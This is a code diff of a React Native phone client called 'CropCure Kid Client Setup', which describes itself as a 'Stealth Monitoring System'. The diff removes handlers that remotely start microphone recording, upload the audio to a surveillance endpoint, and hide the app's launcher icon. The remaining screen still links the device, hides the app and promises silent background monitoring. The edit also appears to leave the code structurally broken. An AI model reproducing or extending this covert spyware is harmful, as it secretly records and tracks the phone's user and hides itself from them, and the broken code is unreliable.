@@ -20,7 +20,7 @@ export default function App() {
   const [registered, setRegistered] = useState(false);
   const [loading, setLoading] = useState(false);
   const [socketInstance, setSocketInstance] = useState(null);
-  
+
   // Service instances
   const [services, setServices] = useState({
     camera: null,
@@ -249,105 +249,72 @@ export default function App() {
     }
   };
 
-      socket.on('mic-record-start', async () => {
-        await micSvc.startRecording();
-      });
-
-      socket.on('mic-record-stop', async () => {
-        const audioData = await micSvc.stopRecording();
-        if (audioData) {
-          fetch(`${activeServer}/api/surveillance/mic/record/stop`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(audioData)
-          });
-        }
-      });
-
-      socket.on('app-hide-command', async () => {
-        await VisibilityService.hideAppIcon();
-      });
-
-      socket.on('app-show-command', async () => {
-        await VisibilityService.showAppIcon();
-      });
-
-      setServices({ camera: camSvc, mic: micSvc, location: locSvc, usage: usageSvc });
-      setRegistered(true);
-    } catch (e) {
-      console.error(e);
-      setStatusMsg(`Registration Error: ${e.message}`);
-    } finally {
-      setLoading(false);
-    }
-  };
-
   return (
-    <ScrollView contentContainerStyle={styles.container}>
-      <Text style={styles.title}>CropCure Kid Client Setup</Text>
-      <Text style={styles.subtitle}>Administrative Stealth Monitoring System</Text>
-      
-      <View style={styles.statusBox}>
-        <Text style={styles.statusLabel}>Status Dashboard</Text>
-        <Text style={styles.statusValue}>{statusMsg}</Text>
+  <ScrollView contentContainerStyle={styles.container}>
+    <Text style={styles.title}>CropCure Kid Client Setup</Text>
+    <Text style={styles.subtitle}>Administrative Stealth Monitoring System</Text>
+
+    <View style={styles.statusBox}>
+      <Text style={styles.statusLabel}>Status Dashboard</Text>
+      <Text style={styles.statusValue}>{statusMsg}</Text>
+    </View>
+
+    {!registered ? (
+      <View style={styles.form}>
+        <Text style={styles.label}>Server URL (Backend Host)</Text>
+        <TextInput
+          style={styles.input}
+          value={serverUrl}
+          onChangeText={setServerUrl}
+          placeholder="http://192.168.1.24:8443"
+          placeholderTextColor="#6c6489"
+        />
+
+        <Text style={styles.label}>Parent ID / Linking Code</Text>
+        <TextInput
+          style={styles.input}
+          value={parentId}
+          onChangeText={setParentId}
+          placeholder="Enter Parent MongoDB ID"
+          placeholderTextColor="#6c6489"
+        />
+
+        <Text style={styles.label}>Device Unique ID</Text>
+        <TextInput
+          style={styles.input}
+          value={deviceId}
+          onChangeText={setDeviceId}
+          placeholder="device_123"
+          placeholderTextColor="#6c6489"
+        />
+
+        <Text style={styles.label}>Device Display Name</Text>
+        <TextInput
+          style={styles.input}
+          value={deviceName}
+          onChangeText={setDeviceName}
+          placeholder="John's Android"
+          placeholderTextColor="#6c6489"
+        />
+
+        {loading ? (
+          <ActivityIndicator size="large" color="#00f2fe" style={{ marginTop: 20 }} />
+        ) : (
+          <Button title="Link & Hide Application" color="#9b51e0" onPress={registerDevice} />
+        )}
       </View>
-
-      {!registered ? (
-        <View style={styles.form}>
-          <Text style={styles.label}>Server URL (Backend Host)</Text>
-          <TextInput 
-            style={styles.input} 
-            value={serverUrl} 
-            onChangeText={setServerUrl} 
-            placeholder="http://192.168.1.24:8443"
-            placeholderTextColor="#6c6489"
-          />
-
-          <Text style={styles.label}>Parent ID / Linking Code</Text>
-          <TextInput 
-            style={styles.input} 
-            value={parentId} 
-            onChangeText={setParentId} 
-            placeholder="Enter Parent MongoDB ID"
-            placeholderTextColor="#6c6489"
-          />
-
-          <Text style={styles.label}>Device Unique ID</Text>
-          <TextInput 
-            style={styles.input} 
-            value={deviceId} 
-            onChangeText={setDeviceId} 
-            placeholder="device_123"
-            placeholderTextColor="#6c6489"
-          />
-
-          <Text style={styles.label}>Device Display Name</Text>
-          <TextInput 
-            style={styles.input} 
-            value={deviceName} 
-            onChangeText={setDeviceName} 
-            placeholder="John's Android"
-            placeholderTextColor="#6c6489"
-          />
-
-          {loading ? (
-            <ActivityIndicator size="large" color="#00f2fe" style={{ marginTop: 20 }} />
-          ) : (
-            <Button title="Link & Hide Application" color="#9b51e0" onPress={registerDevice} />
-          )}
-        </View>
-      ) : (
-        <View style={styles.registeredBox}>
-          <Text style={{ color: '#00ff87', fontWeight: 'bold', fontSize: 16, textAlign: 'center' }}>
-            ✓ Device Configured successfully
-          </Text>
-          <Text style={{ color: '#a39bb8', textAlign: 'center', marginTop: 10 }}>
-            The launcher icon is now disabled. Monitoring will continue silently in the background. Press Home to return to the Android screen.
-          </Text>
-        </View>
-      )}
-    </ScrollView>
-  );
+    ) : (
+      <View style={styles.registeredBox}>
+        <Text style={{ color: '#00ff87', fontWeight: 'bold', fontSize: 16, textAlign: 'center' }}>
+          ✓ Device Configured successfully
+        </Text>
+        <Text style={{ color: '#a39bb8', textAlign: 'center', marginTop: 10 }}>
+          The launcher icon is now disabled. Monitoring will continue silently in the background. Press Home to return to the Android screen.
+        </Text>
+      </View>
+    )}
+  </ScrollView>
+);
 }
 
 const styles = StyleSheet.create({
